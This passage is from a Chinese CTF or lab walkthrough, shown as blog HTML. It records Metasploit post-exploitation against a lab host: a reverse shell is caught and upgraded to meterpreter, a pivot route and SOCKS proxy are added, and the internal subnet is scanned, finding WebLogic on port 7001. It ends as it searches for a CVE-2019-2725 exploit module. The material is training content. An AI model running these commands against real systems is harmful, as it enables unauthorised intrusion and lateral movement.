-j</span><br><span class="line"><span class="comment">## 显示Command shell session 1 opened (192.168.172.128:4444 -&gt; 192.171.84.5:35924) at 2024-06-12 04:28:32 -0400说明攻击成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看打开的反向Shell</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Active sessions</span></span><br><span class="line"><span class="comment"># ===============</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#   Id  Name  Type            Information  Connection</span></span><br><span class="line"><span class="comment">#   --  ----  ----            -----------  ----------</span></span><br><span class="line"><span class="comment">#   1         shell cmd/unix               192.168.172.128:4444 -&gt; 192.171.84.5:35924 (192.168.172.128)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入会话 1</span></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment"># 运行后无命令行交互提示信息，试试Bash指令get flag-1</span></span><br><span class="line">ls /tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag-{bmh15a88055-61c7-45a6-95a4-6d9a6115a2e1}</span></span><br><span class="line"><span class="comment"># hsperfdata_root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将flag-{bmh15a88055-61c7-45a6-95a4-6d9a6115a2e1}输入场景的flag即成功</span></span><br><span class="line"><span class="comment">## 通过 CTRL-Z 将当前会话放到后台继续执行</span></span><br></pre></td></tr></tbody></table></figure>


<h1 id="12-获取flag2，3，4"><a href="#12-获取flag2，3，4" class="headerlink" title="12.获取flag2，3，4"></a>12.获取flag2，3，4</h1><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询post包含meterpreter的攻击工具并使用</span></span><br><span class="line">search meterpreter type:post</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或直接使用post/multi/manage/shell_to_meterpreter</span></span><br><span class="line">use post/multi/manage/shell_to_meterpreter</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可配置参数列表</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Module options (post/multi/manage/shell_to_meterpreter):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    Name     Current Setting  Required  Description</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   ----     ---------------  --------  -----------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   HANDLER  <span class="literal">true</span>             <span class="built_in">yes</span>       Start an exploit/multi/handler to receive the connection</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   LPORT    4433             <span class="built_in">yes</span>       Port <span class="keyword">for</span> payload to connect to.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   SESSION                   <span class="built_in">yes</span>       The session to run this module on</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置攻击主机</span></span><br><span class="line">set lhost 192.168.172.128</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定1号会话进行升级</span></span><br><span class="line">set session 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台运行</span></span><br><span class="line">run -j</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看打开的 reverse shell</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Active sessions</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">===============</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   Id  Name  Type                   Information          Connection</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  --  ----  ----                   -----------          ----------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  1         shell cmd/unix                              192.168.172.128:4444 -&gt; 192.171.84.5:56920 (192.168.172.128)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  2         meterpreter x86/linux  root @ 192.171.84.5  192.168.172.128:4433 -&gt; 192.171.84.5:52264 (192.168.172.128)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入 meterpreter 会话 2</span></span><br><span class="line">sessions -i 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看网卡列表</span></span><br><span class="line">ipconfig</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Interface  1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">============</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name         : lo</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hardware MAC : 00:00:00:00:00:00</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MTU          : 65536</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Flags        : UP,LOOPBACK</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IPv4 Address : 127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IPv4 Netmask : 255.0.0.0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Interface 24</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">============</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name         : eth0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hardware MAC : 02:42:c0:ab:54:05</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MTU          : 1500</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Flags        : UP,BROADCAST,MULTICAST</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IPv4 Address : 192.171.84.5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IPv4 Netmask : 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看路由表</span></span><br><span class="line">route</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IPv4 network routes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">===================</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#     Subnet        Netmask        Gateway       Metric  Interface</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    ------        -------        -------       ------  ---------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    0.0.0.0       0.0.0.0        192.171.84.1  0       eth0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    192.171.84.0  255.255.255.0  0.0.0.0       0       eth0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 ARP 表</span></span><br><span class="line">arp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ARP cache</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">=========</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#     IP address    MAC address        Interface</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    ----------    -----------        ---------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    192.171.84.1  02:42:96:03:ee:2a  eth0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加Pivot路由</span></span><br><span class="line">run autoroute -s 192.171.84.0/24</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查Pivot路由是否已创建成功</span></span><br><span class="line">run autoroute -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Active Routing Table</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">====================</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    Subnet             Netmask            Gateway</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   ------             -------            -------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   192.171.84.0       255.255.255.0      Session 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># CTRL-Z后台运行</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用auxiliary/scanner/portscan/tcp扫描</span></span><br><span class="line">search portscan</span><br><span class="line">或者</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可配置参数列表</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Module options (auxiliary/scanner/portscan/tcp):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    Name         Current Setting  Required  Description</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   ----         ---------------  --------  -----------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   CONCURRENCY  10               <span class="built_in">yes</span>       The number of concurrent ports to check per host</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   DELAY        0                <span class="built_in">yes</span>       The delay between connections, per thread, <span class="keyword">in</span> milliseconds</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   JITTER       0                <span class="built_in">yes</span>       The delay jitter <span class="built_in">factor</span> (maximum value by <span class="built_in">which</span> to +/- DELAY) <span class="keyword">in</span> milliseconds.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   PORTS        1-10000          <span class="built_in">yes</span>       Ports to scan (e.g. 22-25,80,110-900)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   RHOSTS                        <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   THREADS      1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   TIMEOUT      1000             <span class="built_in">yes</span>       The socket connect <span class="built_in">timeout</span> <span class="keyword">in</span> milliseconds</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据子网掩码推导</span></span><br><span class="line">set rhosts 192.171.84.2-254</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置port</span></span><br><span class="line">set ports 1-66535 # 扫描</span><br><span class="line">或者</span><br><span class="line">set ports 7001 # 根据经验</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数</span></span><br><span class="line">set threads 10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始扫描</span></span><br><span class="line">run -j</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 等到扫描结果 100%</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看主机存活情况</span></span><br><span class="line">hosts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hosts</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">=====</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># address          mac  name          os_name                           os_flavor  os_sp  purpose   info  comments</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-------          ---  ----          -------                           ---------  -----  -------   ----  --------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.168.172.128       192.171.84.5  Debian 10.6 (Linux 6.8.11-amd64)                    firewall</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.2                        Unknown                                             device</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.3                        Unknown                                             device</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.4                        Unknown                                             device</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.5                                                                            client</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看发现的服务列表</span></span><br><span class="line">services</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Services</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">========</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># host             port  proto  name  state   info</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----             ----  -----  ----  -----   ----</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.168.172.128  9937  tcp          closed</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.2     7001  tcp          open</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.3     7001  tcp          open</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.171.84.4     7001  tcp          open</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用auxiliary/server/socks_proxy</span></span><br><span class="line">search socks_proxy</span><br><span class="line">或者</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始扫描</span></span><br><span class="line">run -j</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者在kali终端扫描</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">另开kali终端查看1080端口有无占用</span></span><br><span class="line">ss -lntp | grep 1080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有没有安装proxychains4</span></span><br><span class="line">apt policy proxychains4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装过需要编辑配置文件</span></span><br><span class="line">sudo vim /etc/proxychains4.conf  # 注释socks4 127.0.0.1 9050，添加socks5 127.0.0.1 1080</span><br><span class="line">或者</span><br><span class="line">sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看1080端口</span></span><br><span class="line">ss -lntp | grep 1080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">LISTEN 0      256          0.0.0.0:1080       0.0.0.0:*    <span class="built_in">users</span>:(("ruby",pid=<span class="number">62575</span>,fd=<span class="number">15</span>))</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始扫描(命令窗口运行)</span></span><br><span class="line">proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.171.84.2-5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回到metasploit会话窗口</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新进入 会话1</span></span><br><span class="line">sessions -i 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看http请求详细信息</span></span><br><span class="line">curl http://192.171.84.2:7001 -vv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt; GET / HTTP/1.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt; Host: 192.171.84.2:7001</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt; User-Agent: curl/7.64.0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt; Accept: */*</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt;</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; HTTP/1.1 404 Not Found</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; Date: Wed, 12 Jun 2024 11:24:32 GMT</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; Content-Length: 1164</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; X-Powered-By: Servlet/2.5 JSP/2.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">{ [1164 bytes data]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">100  1164  100  1164    0     0  33257      0 --:--:-- --:--:-- --:--:-- 34235</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">* Connection <span class="comment">#0 to host 192.171.84.2 left intact</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//W3C//DTD HTML 4.0 Draft//EN"</span>&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;HTML&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;HEAD&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;TITLE&gt;Error 404--Not Found&lt;/TITLE&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/HEAD&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;BODY bgcolor=<span class="string">"white"</span>&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;FONT FACE=Helvetica&gt;&lt;BR CLEAR=all&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;TABLE border=0 cellspacing=5&gt;&lt;TR&gt;&lt;TD&gt;&lt;BR CLEAR=all&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;FONT FACE=<span class="string">"Helvetica"</span> COLOR=<span class="string">"black"</span> SIZE=<span class="string">"3"</span>&gt;&lt;H2&gt;Error 404--Not Found&lt;/H2&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/FONT&gt;&lt;/TD&gt;&lt;/TR&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/TABLE&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;TABLE border=0 width=100% cellpadding=10&gt;&lt;TR&gt;&lt;TD VALIGN=top WIDTH=100% BGCOLOR=white&gt;&lt;FONT FACE=<span class="string">"Courier New"</span>&gt;&lt;FONT FACE=<span class="string">"Helvetica"</span> SIZE=<span class="string">"3"</span>&gt;&lt;H3&gt;From RFC 2068 &lt;i&gt;Hypertext Transfer Protocol -- HTTP/1.1&lt;/i&gt;:&lt;/H3&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/FONT&gt;&lt;FONT FACE=<span class="string">"Helvetica"</span> SIZE=<span class="string">"3"</span>&gt;&lt;H4&gt;10.4.5 404 Not Found&lt;/H4&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/FONT&gt;&lt;P&gt;&lt;FONT FACE=<span class="string">"Courier New"</span>&gt;The server has not found anything matching the Request-URI. No indication is given of whether the condition is temporary or permanent.&lt;/p&gt;&lt;p&gt;If the server does not wish to make this information available to the client, the status code 403 (Forbidden) can be used instead. The 410 (Gone) status code SHOULD be used <span class="keyword">if</span> the server knows, through some internally configurable mechanism, that an old resource is permanently unavailable and has no <span class="comment"># # forwarding address.&lt;/FONT&gt;&lt;/P&gt;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/FONT&gt;&lt;/TD&gt;&lt;/TR&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/TABLE&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># &lt;/BODY&gt;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;/HTML&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl http://192.171.84.3:7001 -vv</span><br><span class="line">curl http://192.171.84.4:7001 -vv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找cve-2019-2725并使用</span></span><br><span class="line">search cve-2019-2725</span><br><span class="line">use 0</span><br><span class="line"><span class="meta prompt_"># </span><span 